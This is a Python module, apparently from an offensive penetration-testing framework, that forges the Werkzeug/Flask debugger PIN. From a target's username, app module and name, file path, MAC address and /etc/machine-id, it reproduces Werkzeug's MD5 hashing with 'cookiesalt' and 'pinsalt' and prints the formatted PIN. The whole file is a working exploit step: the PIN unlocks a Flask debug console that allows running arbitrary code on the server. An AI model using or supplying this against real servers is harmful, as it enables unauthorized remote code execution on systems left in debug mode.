from lib.baseClass import BaseModule

class Module(BaseModule):
    __info__ = {}
    __options__ = {
        "mac":None,
        "modname":"flask.app",
        "username":"root",
        "name":"Flask",
        "machine_id":None,
        "path":None
    }

    def run(self):
        import hashlib
        from itertools import chain
        probably_public_bits = [
            self.__options__["username"],  # username
            self.__options__["modname"],  # modname
            self.__options__["name"],  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
            self.__options__["path"]  # getattr(mod, '__file__', None),
        ]

        private_bits = [
            str(int(self.__options__["mac"].replace(":",""),base=16)),  # str(uuid.getnode()),  /sys/class/net/ens33/address
            self.__options__["machine_id"]  # get_machine_id(), /etc/machine-id
        ]

        h = hashlib.md5()
        for bit in chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode('utf-8')
            h.update(bit)
        h.update(b'cookiesalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        num = None
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]

        rv = None
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                  for x in range(0, len(num), group_size))
                    break
            else:
                rv = num

        print(rv)